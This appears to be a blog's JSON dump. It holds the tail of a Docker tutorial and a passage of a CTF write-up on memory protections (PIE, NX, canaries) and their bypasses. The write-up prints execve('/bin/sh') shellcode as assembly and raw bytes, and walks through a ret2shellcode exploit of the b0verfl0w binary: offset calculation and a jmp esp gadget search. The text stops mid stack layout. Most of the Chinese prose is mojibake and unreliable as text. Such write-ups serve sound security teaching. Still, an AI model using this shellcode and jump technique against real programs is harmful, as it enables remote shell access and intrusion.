é™¤å¯ä»¥åŠ  -f å‚æ•°è¿›è¡Œå¼ºåˆ¶åˆ é™¤ï¼š 1234567[root@docker ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4cf61416ee67 nginx &quot;/docker-entrypoint.â€¦&quot; 15 minutes ago Up 7 minutes 0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp nginx1[root@docker ~]# docker rm -f nginx1nginx1[root@docker ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES å®¹å™¨æ—¥å¿—ä½¿ç”¨å‘½ä»¤ docker logs &#123;å®¹å™¨ID|å®¹å™¨åç§°&#125; æ¥æŸ¥çœ‹å®¹å™¨è¿è¡Œæ—¶çš„æ—¥å¿—ï¼š 12345678910111213141516171819[root@docker ~]# docker run -p 8081:80 -d --name myweb nginx497eff031c03927f17fe14fcff49bea832403687d580294c42f9cfba697a1564[root@docker ~]# docker logs myweb/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d//docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh/docker-entrypoint.sh: Configuration complete; ready for start up2022/05/02 05:30:57 [notice] 1#1: using the &quot;epoll&quot; event method2022/05/02 05:30:57 [notice] 1#1: nginx/1.21.62022/05/02 05:30:57 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6)2022/05/02 05:30:57 [notice] 1#1: OS: Linux 4.18.0-348.el8.0.2.x86_642022/05/02 05:30:57 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:10485762022/05/02 05:30:57 [notice] 1#1: start worker processes2022/05/02 05:30:57 [notice] 1#1: start worker process 322022/05/02 05:30:57 [notice] 1#1: start worker process 33 å®¹å™¨è½¬é•œåƒä½¿ç”¨å‘½ä»¤ docker commit &#123;å®¹å™¨ID|å®¹å™¨åç§°&#125; é•œåƒåç§° æ¥æ‰“åŒ…å®¹å™¨ï¼Œå¦‚æœå®¹å™¨åœ¨è¿è¡Œä¸­å¯ä»¥ä½¿ç”¨ -p å‚æ•°ï¼š 1234567[root@docker ~]# docker commit -p myweb myweb:v1.0sha256:05f5efa5b56fd3d9c6d17b74ee4a3e9866095ac8cc681879dda21b9b7a968859[root@docker ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEmyweb v1.0 05f5efa5b56f 4 seconds ago 142MBnginx latest fa5269854a5e 11 days ago 142MBhello-world latest feb5d9fea6a5 7 months ago 13.3kB å®¹å™¨ä¿¡æ¯ä½¿ç”¨å‘½ä»¤ docker inspect &#123;å®¹å™¨ID|å®¹å™¨åç§°&#125; æ¥æŸ¥çœ‹å®¹å™¨çš„è¯¦ç»†ä¿¡æ¯ã€‚è¿™é‡Œä¸¾ä¾‹ç­›é€‰å‡ºå®¹å™¨çš„ IPï¼š 12345678910111213141516[root@docker ~]# docker inspect myweb|grep IP &quot;LinkLocalIPv6Address&quot;: &quot;&quot;, &quot;LinkLocalIPv6PrefixLen&quot;: 0, &quot;SecondaryIPAddresses&quot;: null, &quot;SecondaryIPv6Addresses&quot;: null, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;IPAddress&quot;: &quot;172.17.0.2&quot;, &quot;IPPrefixLen&quot;: 16, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;IPAMConfig&quot;: null, &quot;IPAddress&quot;: &quot;172.17.0.2&quot;, &quot;IPPrefixLen&quot;: 16, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0,","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"PWN-shellcode","slug":"PWN-shellcode","date":"2025-06-03T11:56:27.000Z","updated":"2025-06-06T04:51:45.787Z","comments":true,"path":"2025/06/03/PWN-shellcode/","permalink":"http://example.com/2025/06/03/PWN-shellcode/","excerpt":"PWN-shellcodeåœ¨å¼€å§‹ä¹‹å‰å‘¢é¦–å…ˆæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ç¼–è¯‘å™¨å¼€å¯çš„ä¸€äº›ä¿æŠ¤æªæ–½ ä¸€ã€PIE çš„åŸºæœ¬æ¦‚å¿µPIEï¼ˆPosition Independent Executableï¼‰ æ˜¯ç°ä»£æ“ä½œç³»ç»Ÿä¸­ç”¨äºæå‡å®‰å…¨æ€§çš„ä¸€ä¸ªå…³é”®æœºåˆ¶ã€‚å®ƒå…è®¸å¯æ‰§è¡Œæ–‡ä»¶åœ¨è¿è¡Œæ—¶è¢«åŠ è½½åˆ°å†…å­˜ä¸­çš„ä»»æ„åœ°å€ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå›ºå®šçš„åœ°å€ï¼Œä»è€Œé…åˆ ASLRï¼ˆAddress Space Layout Randomizationï¼‰ è¿›è¡Œåœ°å€ç©ºé—´çš„éšæœºåŒ–ï¼Œé˜²æ­¢æ”»å‡»è€…é¢„æµ‹ä»£ç åœ°å€ã€‚","text":"PWN-shellcodeåœ¨å¼€å§‹ä¹‹å‰å‘¢é¦–å…ˆæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ç¼–è¯‘å™¨å¼€å¯çš„ä¸€äº›ä¿æŠ¤æªæ–½ ä¸€ã€PIE çš„åŸºæœ¬æ¦‚å¿µPIEï¼ˆPosition Independent Executableï¼‰ æ˜¯ç°ä»£æ“ä½œç³»ç»Ÿä¸­ç”¨äºæå‡å®‰å…¨æ€§çš„ä¸€ä¸ªå…³é”®æœºåˆ¶ã€‚å®ƒå…è®¸å¯æ‰§è¡Œæ–‡ä»¶åœ¨è¿è¡Œæ—¶è¢«åŠ è½½åˆ°å†…å­˜ä¸­çš„ä»»æ„åœ°å€ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå›ºå®šçš„åœ°å€ï¼Œä»è€Œé…åˆ ASLRï¼ˆAddress Space Layout Randomizationï¼‰ è¿›è¡Œåœ°å€ç©ºé—´çš„éšæœºåŒ–ï¼Œé˜²æ­¢æ”»å‡»è€…é¢„æµ‹ä»£ç åœ°å€ã€‚ 1. ä»€ä¹ˆæ˜¯ PIEï¼ŸPIEï¼ˆPosition Independent Executableï¼Œä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼‰æ˜¯ä¸€ç§ç¼–è¯‘æ–¹å¼ï¼Œä½¿å¾—æ•´ä¸ªç¨‹åºï¼ˆåŒ…æ‹¬ä»£ç æ®µå’Œæ•°æ®æ®µï¼‰éƒ½æ”¯æŒä½ç½®æ— å…³ï¼ˆPosition Independent Code, PICï¼‰ã€‚PIE ç¨‹åºåœ¨åŠ è½½æ—¶å¯ä»¥è¢«æ˜ å°„åˆ°å†…å­˜ä¸­çš„ä»»æ„åœ°å€ã€‚ 2. ä¸ºä»€ä¹ˆéœ€è¦ PIEï¼ŸPIE æ˜¯ä¸ºäº†æ”¯æŒ ASLRã€‚å¦‚æœç¨‹åºæ˜¯å›ºå®šåœ°å€åŠ è½½ï¼Œå³ä½¿ç³»ç»Ÿå¯ç”¨äº† ASLRï¼Œä¹Ÿæ— æ³•éšæœºåŒ–ä¸»ç¨‹åºçš„åŠ è½½åœ°å€ï¼Œæ”»å‡»è€…å¯ä»¥è½»æ˜“å®šä½åˆ°å…³é”®ä»£ç ä½ç½®ã€‚ 3. PIE å’Œ PIC çš„åŒºåˆ« ç‰¹æ€§ PIC PIE åº”ç”¨ é€šå¸¸ç”¨äºå…±äº«åº“ï¼ˆ.soï¼‰ ç”¨äºæ•´ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ æ˜¯å¦ç‹¬ç«‹æ‰§è¡Œ å¦ï¼ˆä¾é™„ä¸»ç¨‹åºï¼‰ æ˜¯ï¼ˆæœ¬èº«æ˜¯ä¸€ä¸ªç‹¬ç«‹ç¨‹åºï¼‰ æ”¯æŒASLR å¦ï¼ˆä¸»ç¨‹åºä¸æ”¯æŒï¼‰ æ˜¯ï¼ˆä¸»ç¨‹åºæ”¯æŒï¼‰ äºŒã€PIE çš„å·¥ä½œåŸç† PIE ç¼–è¯‘æ—¶ç”Ÿæˆçš„æ˜¯ ä½ç½®æ— å…³ä»£ç ï¼ˆé€šè¿‡å¯„å­˜å™¨åç§»è®¿é—®å…¨å±€æ•°æ®ã€å‡½æ•°æŒ‡é’ˆç­‰ï¼‰ï¼Œä¸å…±äº«åº“ç›¸ä¼¼ã€‚ åŠ è½½å™¨å¯ä»¥å°† PIE å¯æ‰§è¡Œæ–‡ä»¶æ˜ å°„åˆ°éšæœºçš„å†…å­˜åœ°å€ã€‚ æ‰€æœ‰ç¬¦å·å¼•ç”¨é€šè¿‡åŸºå€åŠ åç§»çš„æ–¹å¼è®¡ç®—åœ°å€ï¼Œè€Œéå›ºå®šåœ°å€ã€‚ ä¸‰ã€å¦‚ä½•å¯ç”¨å’Œè¯†åˆ« PIE1. ç¼–è¯‘å¯ç”¨ PIEåœ¨ä½¿ç”¨ gcc æˆ– clang æ—¶ï¼ŒåŠ ä¸Šä»¥ä¸‹å‚æ•°ï¼š 1gcc -fPIE -pie main.c -o main å››ã€PIE çš„ä¼˜ç‚¹ä¸ç¼ºç‚¹ä¼˜ç‚¹ï¼š æ”¯æŒ ASLRï¼Œå¢å¼ºå®‰å…¨æ€§ï¼Œé™ä½ Exploit çš„å¯é æ€§ã€‚ é˜²æ­¢ ROPï¼ˆReturn Oriented Programmingï¼‰æ”»å‡»ä¸­ gadget åœ°å€çš„ç¡¬ç¼–ç ã€‚ ç¼ºç‚¹ï¼š è¿è¡Œæ—¶æ€§èƒ½ç¨æœ‰ä¸‹é™ï¼ˆéœ€è¦è®¡ç®—åç§»åœ°å€ï¼‰ã€‚ ç¼–è¯‘å’Œé“¾æ¥ç•¥å¤æ‚ï¼ˆéœ€è¦å¤„ç†åŸºåœ°å€åç§»ç­‰é—®é¢˜ï¼‰ã€‚ å³ä½¿ç¼–è¯‘çš„æ—¶å€™å¼€å¯äº†PIEè€Œæ“ä½œç³»ç»Ÿæ²¡æœ‰å¼€å¯ASLRé‚£ä¹ˆPIEæ˜¯æ— æ•ˆçš„ å› ä¸ºPIEæ˜¯åŸºäºASLRå®ç°çš„ äºŒã€NXNXä¿æŠ¤ï¼ˆNo eXecute &#x2F; æ•°æ®ä¸å¯æ‰§è¡Œï¼‰ æ˜¯ç°ä»£æ“ä½œç³»ç»Ÿä¸­çš„ä¸€é¡¹å…³é”®å†…å­˜å®‰å…¨ä¿æŠ¤æœºåˆ¶ï¼Œç”¨äºé˜²æ­¢æ¶æ„ä»£ç æ‰§è¡Œã€‚å®ƒä¸»è¦é€šè¿‡æ ‡è®°å†…å­˜é¡µæ˜¯å¦å…è®¸æ‰§è¡Œæ¥é˜»æ­¢ ç¼“å†²åŒºæº¢å‡º å’Œ Shellcode æ³¨å…¥æ”»å‡»ã€‚ ä¸€ã€ä»€ä¹ˆæ˜¯ NX ä¿æŠ¤ï¼ŸNXï¼ˆNo eXecuteï¼‰ï¼Œä¹Ÿå« DEPï¼ˆData Execution Preventionï¼‰ï¼Œæ˜¯ä¸€ç§å†…å­˜é¡µè®¿é—®æƒé™æ§åˆ¶æŠ€æœ¯ã€‚å…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š åªå…è®¸ä»£ç æ®µæ‰§è¡Œï¼Œç¦æ­¢æ•°æ®æ®µæ‰§è¡Œã€‚ æ”»å‡»è€…å¸¸å¸¸é€šè¿‡ç¼“å†²åŒºæº¢å‡ºå°† Shellcode æ³¨å…¥å †æ ˆã€å †ä¸­ï¼Œå¦‚æœè¿™äº›å†…å­˜åŒºåŸŸæ ‡è®°ä¸ºä¸å¯æ‰§è¡Œï¼Œåˆ™æ³¨å…¥çš„ä»£ç å°±æ— æ³•è¢« CPU æ‰§è¡Œï¼Œä»è€Œé˜»æ­¢äº†æ¼æ´åˆ©ç”¨ã€‚ äºŒã€åœ¨ç¼–è¯‘æ—¶å¯ç”¨ NXé€šå¸¸ï¼Œç°ä»£ç¼–è¯‘å™¨é»˜è®¤ä¼šç”Ÿæˆ NX æ”¯æŒçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚å¦‚æœä½ ä½¿ç”¨çš„æ˜¯è¾ƒè€çš„ç³»ç»Ÿæˆ–æ‰‹åŠ¨ç¼–è¯‘ï¼Œå»ºè®®æ·»åŠ ä»¥ä¸‹ç¼–è¯‘å™¨å‚æ•°ï¼š 1gcc -z noexecstack main.c -o main ä¸‰ã€ç»•è¿‡ NX çš„å¸¸è§æ–¹æ³•ï¼ˆä¾›é˜²å¾¡è€…ç†è§£ï¼‰è™½ç„¶ NX èƒ½é˜»æ­¢ä»£ç æ³¨å…¥æ‰§è¡Œï¼Œä½†æ— æ³•é˜²æ­¢åœ°å€å¤ç”¨ã€‚æ”»å‡»è€…å¸¸ç”¨ä»¥ä¸‹æŠ€å·§ç»•è¿‡ NXï¼š ç»•è¿‡æ–¹å¼ è¯´æ˜ ROPï¼ˆReturn Oriented Programmingï¼‰ åˆ©ç”¨å·²æœ‰çš„ä»£ç ç‰‡æ®µï¼ˆgadgetï¼‰æ‹¼è£…æ”»å‡»é“¾ ret2libc é‡å®šå‘æ§åˆ¶æµæ‰§è¡Œ libc ä¸­çš„ system(&quot;/bin/sh&quot;) JIT Spraying é’ˆå¯¹æµè§ˆå™¨ JIT ç¼–è¯‘å™¨è¿›è¡Œæ”»å‡»ï¼Œæ„é€ å¯æ‰§è¡Œæ®µ mprotect&#x2F;mmap æ‰§è¡Œé¡µæ”¹å†™ åˆ©ç”¨å·²çŸ¥å‡½æ•°æ”¹å˜é¡µæƒé™ä½¿æ•°æ®å¯æ‰§è¡Œï¼ˆéœ€æ³„æ¼åœ°å€ï¼‰ å› æ­¤ï¼Œå®é™…é˜²æŠ¤ä¸­åº”é…åˆ ASLRã€Stack Canaryã€RELRO ç­‰æœºåˆ¶ä¸€èµ·ä½¿ç”¨ã€‚ ä¸‰ã€Canary çš„å·¥ä½œæœºåˆ¶1. æ ˆå¸§å¸ƒå±€æ”¹å˜ï¼ˆæœ‰ Canary æ—¶ï¼‰ä»¥ x86 ä¸ºä¾‹ï¼Œå‡½æ•°æ ˆå¸§å¸ƒå±€ï¼š 1234567sqlå¤åˆ¶ç¼–è¾‘+---------------------+| è¿”å›åœ°å€ | â† old EBP+---------------------+| Canaryï¼ˆé‡‘ä¸é›€ï¼‰ |+---------------------+| å±€éƒ¨å˜é‡/ç¼“å†²åŒºç­‰ |+---------------------+ 2. è¿è¡Œæµç¨‹ å‡½æ•°è°ƒç”¨æ—¶ï¼šç¼–è¯‘å™¨æ’å…¥ä»£ç ç”Ÿæˆéšæœºçš„ Canary å€¼å¹¶å‹å…¥æ ˆä¸­ã€‚ å‡½æ•°è¿”å›å‰ï¼šç¼–è¯‘å™¨æ’å…¥ä»£ç æ£€æµ‹æ ˆä¸Šçš„ Canary å€¼æ˜¯å¦è¢«ä¿®æ”¹ã€‚ è‹¥å€¼è¢«ç¯¡æ”¹ï¼šè¯´æ˜å­˜åœ¨æ ˆæº¢å‡ºæ”»å‡»ï¼Œç¨‹åºè§¦å‘ __stack_chk_fail()ï¼Œç«‹åˆ»ç»ˆæ­¢è¿è¡Œã€‚ ä¸€ã€Canary çš„ç±»å‹GCC å®ç°ä¸­ï¼Œå¸¸è§çš„ Canary ç±»å‹æœ‰ä¸‰ç§ï¼š ç±»å‹ ç‰¹ç‚¹ Terminator Canary åŒ…å«ä¸å¯æ‰“å°å­—ç¬¦ï¼ˆå¦‚ 0x00ã€0x0Dã€0x0Aï¼‰ï¼Œé˜²æ­¢ strcpy() ç­‰å‡½æ•°è¦†ç›–å®ƒ Random Canary æ¯æ¬¡ç¨‹åºè¿è¡Œæ—¶éšæœºç”Ÿæˆï¼Œæ”»å‡»è€…å¾ˆéš¾çŒœåˆ°å…¶å€¼ TLS-based Canary æ¯çº¿ç¨‹ç‹¬ç«‹ä¸€ä¸ª Canaryï¼Œæé«˜å¤šçº¿ç¨‹ç¨‹åºçš„å®‰å…¨æ€§ äºŒã€ç¼–è¯‘å¯ç”¨ Canary1. GCC ç¼–è¯‘é€‰é¡¹ å‚æ•° è¯´æ˜ -fstack-protector ä¿æŠ¤åŒ…å«æ•°ç»„ç­‰å˜é‡çš„å‡½æ•° -fstack-protector-strong ä¿æŠ¤æ›´å¤šå‡½æ•°ï¼ˆæ¨èï¼‰ -fstack-protector-all æ‰€æœ‰å‡½æ•°éƒ½å¯ç”¨ Canary 1gcc -fstack-protector-strong -o main main.c ä¸‰ã€Canary ç»•è¿‡éš¾ç‚¹ä¸æ”»å‡»æ–¹å¼è™½ç„¶ Canary æé«˜äº†å®‰å…¨æ€§ï¼Œä½†ç†è®ºä¸Šä¸æ˜¯ç»å¯¹ä¸å¯ç»•è¿‡çš„ã€‚å¸¸è§ç»•è¿‡æ–¹å¼åŒ…æ‹¬ï¼š ç»•è¿‡æ–¹æ³• åŸç† ä¿¡æ¯æ³„éœ² é€šè¿‡æ¼æ´æ³„éœ² Canary çš„å€¼ï¼Œå†æ„é€  Payload éæº¢å‡ºæ”»å‡» ä½¿ç”¨ UAFã€æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€Heap æ”»å‡»ç­‰ç»•è¿‡ Canary ä¸ç ´å Canary çš„æ”»å‡» æ¯”å¦‚ ROPï¼Œä¸éœ€è¦è¦†ç›–è¿”å›åœ°å€æˆ–è¦†ç›–å‰å…ˆä¿ç•™ Canary è¦†ç›–ç»“æ„ä½“æŒ‡é’ˆ Canary åªä¿æŠ¤è¿”å›åœ°å€ï¼Œä¸ä¿æŠ¤æ‰€æœ‰æ ˆæ•°æ® å››ã€Canary çš„å±€é™æ€§ å±€é™ç‚¹ æè¿° åªæ£€æµ‹è¿”å›åœ°å€ç ´å æ— æ³•é˜²æ­¢å…¶ä»–ç±»å‹çš„æ•°æ®ç ´å ä¿¡æ¯æ³„éœ²å¯è¢«ç»•è¿‡ ä¸€æ—¦æ³„æ¼ Canary å€¼ï¼Œä¿æŠ¤å¤±æ•ˆ æ€§èƒ½å½±å“ï¼ˆæå°ï¼‰ æ¯ä¸ªå‡½æ•°éƒ½å¤šä¸€æ¬¡ Canary æ£€æŸ¥ï¼ˆå‡ ä¹å¿½ç•¥ä¸è®¡ï¼‰ shellcodeæ˜¯ä»€ä¹ˆï¼Ÿshellcode å…¶å®å°±æ˜¯ä¸€å°æ®µä»£ç  å¯ä»¥ç”¨äºè½¯ä»¶æ¼æ´åˆ©ç”¨çš„è½½è· è¢«ç§°ä¸º shellcode æ˜¯å› ä¸ºå®ƒé€šå¸¸å¯åŠ¨ä¸€ä¸ªå‘½ä»¤ç»ˆç«¯ æ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™ä¸ªç»ˆç«¯æ§åˆ¶å—å®³çš„è®¡ç®—æœº ä½†æ˜¯æ‰€æœ‰æ‰§è¡Œç±»ä¼¼ä»»åŠ¡çš„ä»£ç ç‰‡æ®µéƒ½å¯ä»¥ç§°ä½œshellcode Shellcodeé€šå¸¸æ˜¯ä»¥æœºå™¨ç å½¢å¼ç¼–å†™çš„ åœ¨Pwntoolsä¸­ å†…ç½®äº†ä¸€äº›shellcodeä¸ç¼–è¯‘æ–¹å¼ åªéœ€è¦ä½¿ç”¨ä»¥ä¸‹æ–¹å¼å°±å¯ä»¥è°ƒç”¨ 1print(shellcraft.amd64.sh()) è¾“å‡ºå¦‚ä¸‹æ‰€ç¤º 1234567891011121314151617181920212223â””â”€[$]&gt; /usr/bin/python3 /home/pwn/æ¡Œé¢/pwn/å±±åŒ–è¯¾ç¨‹/day02-ret2shellcode/testshellcode.py /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */ /* push b&#x27;/bin///sh\\x00&#x27; */ push 0x68 mov rax, 0x732f2f2f6e69622f push rax mov rdi, rsp /* push argument array [&#x27;sh\\x00&#x27;] */ /* push b&#x27;sh\\x00&#x27; */ push 0x1010101 ^ 0x6873 xor dword ptr [rsp], 0x1010101 xor esi, esi /* 0 */ push rsi /* null terminate */ push 8 pop rsi add rsi, rsp push rsi /* &#x27;sh\\x00&#x27; */ mov rsi, rsp xor edx, edx /* 0 */ /* call execve() */ push SYS_execve /* 0x3b */ pop rax syscall å¥—ç”¨asmå‡½æ•° å°±å¯ä»¥å¾—åˆ°å¯¹åº”çš„shellcode ä½†æ˜¯æ³¨æ„åœ¨è°ƒç”¨å‰éœ€è¦è®¾ç½®æ¶æ„ 12context.arch = &#x27;amd64&#x27;print(asm(shellcraft.amd64.sh())) è¾“å‡ºå¦‚ä¸‹æ‰€ç¤º 1b&#x27;jhH\\xb8/bin///sPH\\x89\\xe7hri\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05&#x27; ret2shellcode å³æ§åˆ¶ç¨‹åºæ‰§è¡Œshellcodeä»£ç  shellcodeæŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç  å¸¸è§çš„åŠŸèƒ½ä¸»è¦æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„shell ä¸€èˆ¬æ¥è¯´shellcodeéœ€è¦æˆ‘ä»¬è‡ªå·²å¡«å…… è¿™å…¶å®æ˜¯å¦å¤–ä¸€ç§å…¸å‹çš„åˆ©ç”¨æ–¹æ³• å³æ­¤æ—¶æˆ‘ä»¬éœ€è¦è‡ªå·²å»å¡«å……ä¸€äº›å¯æ‰§è¡Œçš„ä»£ç  è¿™ç§æ‰‹æ³•ä¸éœ€è¦ç¨‹åºå†…éƒ¨å…·æœ‰systemä¹‹ç±»çš„å‡½æ•° åœ¨æœ€æ—©çš„æ—¶å€™ååˆ†å¸¸è§ åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Š è¦æƒ³æ‰§è¡Œshellcode éœ€è¦å¯¹åº”çš„binaryåœ¨è¿è¡Œæ—¶ shellcodeæ‰€åœ¨çš„åŒºåŸŸå…·æœ‰å¯æ‰§è¡Œæƒé™ ç¬¬ä¸€ç§åˆ©ç”¨æ–¹å¼ æ ¹æ®å‡½æ•°è°ƒç”¨çº¦å®š åœ¨ä¸€ä¸ªå‡½æ•°æ‰§è¡Œçš„æœ€åæ˜¯ä¸€ä¸ª leave ret å®è´¨æ˜¯ mov esp,ebp pop ebp pop eip è¿™æ—¶å€™æˆ‘ä»¬åœ¨å¡«å……ä¸€ä¸ªshellcode ç„¶åæ§åˆ¶è¿”å›åœ°å€ä¸º jmp esp å³å¯åˆ©ç”¨ ä¹‹åæ‹¿åˆ°ä¾‹é¢˜å¼€å§‹å¤ç° ä½¿ç”¨checksecæŸ¥ä¿æŠ¤ 1checksec --file=b0verfl0w 1234â”€[$]&gt; checksec --file=b0verfl0wRELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 74 Symbols No 0 2b0verfl0w æœªå¼€å¯ä»»ä½•ä¿æŠ¤ 1234567891011121314int vul()&#123; char s[32]; // [esp+18h] [ebp-20h] BYREF puts(&quot;\\n======================&quot;); puts(&quot;\\nWelcome to X-CTF 2016!&quot;); puts(&quot;\\n======================&quot;); puts(&quot;What&#x27;s your name?&quot;); fflush(stdout); fgets(s, 50, stdin); printf(&quot;Hello %s.&quot;, s); fflush(stdout); return 1;&#125; è¿™æ˜¯å‡½æ•°çš„ä¸»å‡½æ•° ç»è¿‡åˆ†æä¹‹åå‘ç°å¹¶æ²¡æœ‰ bin/sh æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æƒ³åˆ°çš„æ˜¯ç”¨shellcode æ¯•ç«Ÿæ²¡æœ‰å¼€å¯NXä¿æŠ¤ å®šä½æ³„éœ²ä½ç½®å¯ä»¥é€šè¿‡idaè®¡ç®— 12345678910111213141516171819202122232425262728293031323334-0000000000000020 char s;-000000000000001F // padding byte-000000000000001E // padding byte-000000000000001D // padding byte-000000000000001C // padding byte-000000000000001B // padding byte-000000000000001A // padding byte-0000000000000019 // padding byte-0000000000000018 // padding byte-0000000000000017 // padding byte-0000000000000016 // padding byte-0000000000000015 // padding byte-0000000000000014 // padding byte-0000000000000013 // padding byte-0000000000000012 // padding byte-0000000000000011 // padding byte-0000000000000010 // padding byte-000000000000000F // padding byte-000000000000000E // padding byte-000000000000000D // padding byte-000000000000000C // padding byte-000000000000000B // padding byte-000000000000000A // padding byte-0000000000000009 // padding byte-0000000000000008 // padding byte-0000000000000007 // padding byte-0000000000000006 // padding byte-0000000000000005 // padding byte-0000000000000004 // padding byte-0000000000000003 // padding byte-0000000000000002 // padding byte-0000000000000001 // padding byte+0000000000000000 _DWORD __saved_registers;+0000000000000004 _UNKNOWN *__return_address; s -&gt; return æ˜¯ 0x20 + 4 &#x3D; 32+4 &#x3D; 36 ä½†æ˜¯å‘¢ è¿™é“é¢˜æ¯”è¾ƒç‰¹æ®Š å› ä¸ºä»–é™åˆ¶äº†è¾“å…¥çš„å­—ç¬¦ fgets(s, 50, stdin); åªèƒ½è¾“å…¥50ä¸ªå­—ç¬¦ ä½†æ˜¯pwntoolsç”Ÿæˆçš„shellcodeå­—ç¬¦æ•°è¿‡äºåºå¤§ ä¸”ä¼šè¢«æˆªæ–­ æ‰€ä»¥æˆ‘ä»¬è¦æ¢ä¸ªæ€è·¯ é¦–å…ˆ æˆ‘ä»¬æ˜¯å¦å¯ä»¥é€šè¿‡ retçš„ç‰¹æ€§(ret = jmp esp add esp,4)æ¥è¿›è¡Œç§»æ¤è·³è½¬å‘¢ åŸç†å°±æ˜¯é€šè¿‡æƒ³æ ˆä¸Šç›´æ¥å†™shellcode ç„¶åå†é€šè¿‡ jmp espçš„æ–¹å¼å»è·³è½¬åˆ°shellcodeçš„å¤´å‘¢ è¿™æ ·æ˜¯å¯è¡Œçš„ æˆ‘ä»¬å¼€å§‹æ„é€  é¦–å…ˆæˆ‘ä»¬éœ€è¦è‡ªå·²ç¼–å†™ä¸€ä¸ªshellcode å¦‚ä¸‹æ‰€ç¤º 123456789101112131415; global _start; _start:; xor eax,eax ;//eaxç½®0; xor edx,edx ;//edxç½®0; push edx; push sh; push bin ;//å°†/bin/shå…¥æ ˆ; mov ebx,esp ;//ebxæŒ‡å‘/bin/shè¿™ä¸ªå­—ç¬¦ä¸²; xor ecx,ecx; mov al,0Bh ;//eaxç½®ä¸ºexecveå‡½æ•°çš„ä¸­æ–­å·; int 80h ;//è°ƒç”¨è½¯ä¸­æ–­; section .data; sh: db &#x27;/sh&#x27;; bin:db &#x27;/bin&#x27; æˆ–è€…è‡ªå·²å»shellcodeç½‘ç«™ä¸‹è½½ä¸€æ®µshellcode ç´§æ¥ç€æˆ‘ä»¬è¿˜å¾—è®¡ç®—å‡ºè¿™æ®µshllcodeçš„é•¿åº¦ å› ä¸ºæˆ‘ä»¬è¦æŠŠå‰©ä¸‹çš„å­—èŠ‚ç»™è¡¥æˆåƒåœ¾æ•°æ® ç„¶åæˆ‘ä»¬ç°åœ¨éœ€è¦çš„å°±æ˜¯ä¸€ä¸ª jmp espçš„åœ°å€ ä¹‹åæˆ‘ä»¬å°±è®© ret å¤„è®©ä»– jmp_esp ç”¨ ropper æœç´¢å³å¯ 123456789101112131415161718(Pwn-py312) (base) cccccchow@Chow:~/pwn/AAA/å±±åŒ–è¯¾ç¨‹/day02-ret2shellcode$ ropper(ropper)&gt; file b0verfl0w[INFO] Load gadgets from cache[LOAD] loading... 100%[LOAD] removing double gadgets... 100%[INFO] File loaded.(b0verfl0w/ELF/x86)&gt; jmp espJMP Instructions================0x08048504: jmp esp; 1 gadgets found(b0verfl0w/ELF/x86)&gt; æˆ–è€…ç”¨ROPgadgetæœç´¢ä¹Ÿå¯ä»¥ 1ROPgadget --binary b0verfl0w --only &quot;jmp&quot; 12345670x080483ab : jmp 0x80483900x080484f2 : jmp 0x80484700x08048611 : jmp 0x80486200x0804855d : jmp dword ptr [ecx + 0x804a040]0x08048550 : jmp dword ptr [ecx + 0x804a060]0x0804876f : jmp dword ptr [ecx]0x08048504 : jmp esp 0x08048504 å°±æ‰¾åˆ°äº†æˆ‘ä»¬çš„åœ°å€ è·³è½¬åˆ° espä¹‹åæˆ‘ä»¬è¿˜å¾—æ„é€ ä¸€ä¸ªä¸œè¥¿ é‚£å°±æ˜¯ è®©espæŒ‡å‘shellcodeçš„å¤´éƒ¨ é¦–å…ˆæˆ‘ä»¬è®¡ç®— 12345678910111213141516171819202122232425262728293031323334-0000000000000020 char s;-000000000000001F // padding byte-000000000000001E // padding byte-000000000000001D // padding byte-000000000000001C // padding byte-000000000000001B // padding byte-000000000000001A // padding byte-0000000000000019 // padding byte-0000000000000018 // padding byte-0000000000000017 // padding byte-0000000000000016 // padding byte-0000000000000015 // padding byte-0000000000000014 // padding byte-0000000000000013 // padding byte-0000000000000012 // padding byte-0000000000000011 // padding byte-0000000000000010 // padding byte-000000000000000F // padding byte-000000000000000E // padding byte-000000000000000D // padding byte-000000000000000C // padding byte-000000000000000B // padding byte-000000000000000A // padding 